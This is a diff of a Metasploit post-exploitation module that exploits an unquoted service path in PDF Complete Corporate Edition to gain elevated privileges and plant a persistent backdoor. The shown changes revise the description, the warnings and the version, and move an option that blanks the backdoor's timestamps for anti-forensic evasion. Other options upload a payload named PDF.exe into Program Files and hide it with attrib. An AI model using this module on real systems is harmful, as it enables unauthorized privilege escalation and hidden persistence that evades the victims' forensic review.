@@ -19,10 +19,10 @@
 #
 # [ DESCRIPTION ]
 # PDF Complete Corporate Edition installs a service with an unquoted service path.
-# This enables a local privilege escalation vulnerability. To exploit this vulnerability,
-# a local attacker can insert an executable file in the path of the service.
-# Rebooting the system or restarting the service will run the malicious executable
-# with elevated privileges.
+# This enables a local privilege escalation / persistence backdooring vulnerability.
+# To exploit this vulnerabilitys a local attacker can insert an executable file in
+# the path of the service. Rebooting the system or restarting the service will run
+# the malicious executable with elevated privileges.
 #
 # ---------------------------------------------------------------------------
 # C:\>sc qc pdfcDispatcher                                                        
@@ -56,10 +56,11 @@
 # Blank remote backdoor timestomp attributs?      => set BLANK_TIMESTOMP true
 # ---------------------------------------------------------------------------------------
 # Deploy PDF.exe insted of Program.exe?           => set PDF_EXE true
-# WARNING: advanced option 'PDF_EXE' requires user to build one 'PDF.exe' payload and use
-# 'LOCAL_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
-# examples: set LOCAL_PATH /root/PDF.exe AND set PDF_EXE true
 # ---------------------------------------------------------------------------------------
+# WARNING: advanced option 'set PDF_EXE true' requires user to build one 'PDF.exe' payload
+# and use 'LOCAL_PATH' to deploy it (payload will be deploy in: C:\Program Files (x86)\PDF.exe
+# examples: set LOCAL_PATH /root/PDF.exe AND set PDF_EXE true
+#
 #
 # "WARNING: This module will not delete the payload deployed"
 # "WARNING: Note that only executables explicitly written to interface with the Service Control
@@ -129,8 +130,8 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.5',
-                        'DisclosureDate' => 'nov 21 2016',
+                        'Version'        => '$Revision: 1.6',
+                        'DisclosureDate' => 'nov 23 2016',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true', # requires elevated privileges
@@ -160,12 +161,12 @@ class MetasploitModule < Msf::Post
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('LOCAL_PATH', [ false, 'The full path of Program.exe to be uploaded']),
                                 OptBool.new('SERVICE_STATUS', [ false, 'Check remote pdfcDispatcher service settings?' , false]),
-                                OptBool.new('BLANK_TIMESTOMP', [ false, 'Blank remote backdoor timestomp attributs?' , false]),
                                 OptBool.new('HIDDEN_ATTRIB', [ false, 'Use Attrib command to Hide Program.exe?' , false])
                         ], self.class)
 
                 register_advanced_options(
                         [
+                                OptBool.new('BLANK_TIMESTOMP', [ false, 'Blank remote backdoor timestomp attributs?' , false]),
                                 OptBool.new('PDF_EXE', [ false, 'Deploy PDF.exe insted of Program.exe payload?' , false])
                         ], self.class)
  
